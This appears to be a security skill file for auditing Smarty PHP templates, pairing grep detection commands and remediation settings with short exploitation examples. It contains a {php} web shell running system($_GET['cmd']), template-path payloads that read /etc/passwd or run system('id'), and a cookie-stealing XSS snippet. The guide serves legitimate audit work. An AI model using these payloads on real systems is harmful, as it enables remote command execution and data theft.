---
name: smarty-patterns
description: Smarty template engine security patterns including {php} tag exploitation, security policy bypass, and template resource injection.
---

# Smarty Security Patterns

## 1. {php} Tag Exploitation (Legacy)

**Vulnerable Pattern:** Older Smarty versions (< 3.1) allow `{php}` tags for direct PHP code.

### Detection

```bash
# Check for {php} tags
grep -rn "{php}" --include="*.tpl" --include="*.smarty"

# Check Smarty version
grep -rn "SMARTY_VERSION\|Smarty::" --include="*.php"

# Security policy configuration
grep -rn "security_policy\|enableSecurity" --include="*.php"
```

### Exploitation

```smarty
{php}
system($_GET['cmd']);
{/php}
```

---

## 2. Security Policy Bypass

**Vulnerable Pattern:** Weak security policy configuration allows dangerous functions.

### Detection

```bash
grep -rn "php_functions\|php_modifiers\|allowed_tags" --include="*.php"
```

### Vulnerable Configuration

```php
// Overly permissive policy
$smarty->security_policy->php_functions = ['system', 'passthru'];
$smarty->security_policy->php_modifiers = ['system'];
```

---

## 3. Template Resource Injection

**Vulnerable Pattern:** User-controlled template paths.

### Detection

```bash
grep -rn "->display.*\\\$\|->fetch.*\\\$" --include="*.php"
```

### Exploitation

```php
// Vulnerable code
$smarty->display($_GET['template']);

// Attack: ?template=file:/etc/passwd
// Attack: ?template=string:{system('id')}
```

---

## 4. Modifier Exploitation

**Vulnerable Pattern:** Custom modifiers or dangerous built-in modifiers.

### Detection

```bash
grep -rn "registerPlugin.*modifier" --include="*.php"
```

### Exploitation

```smarty
{$userInput|escape:'javascript'}  // May allow XSS in some contexts
{$var|@system}  // If system is allowed as modifier
```

---

## 5. {literal} + JavaScript Injection

**Vulnerable Pattern:** {literal} blocks disable Smarty parsing, allowing XSS.

### Detection

```bash
grep -rn "{literal}" --include="*.tpl"
```

### Exploitation

```smarty
{literal}
<script>alert(document.cookie)</script>
{/literal}
```

---

## 6. Remediation

```php
// Enable security class
$smarty->enableSecurity('Smarty_Security');

// Configure strict policy
$security = new Smarty_Security($smarty);
$security->php_functions = [];
$security->php_modifiers = [];
$security->allowed_tags = ['if', 'foreach'];
$smarty->enableSecurity($security);

// Disable {php} tags (Smarty 3.1+)
$smarty->php_handling = Smarty::PHP_REMOVE;
```
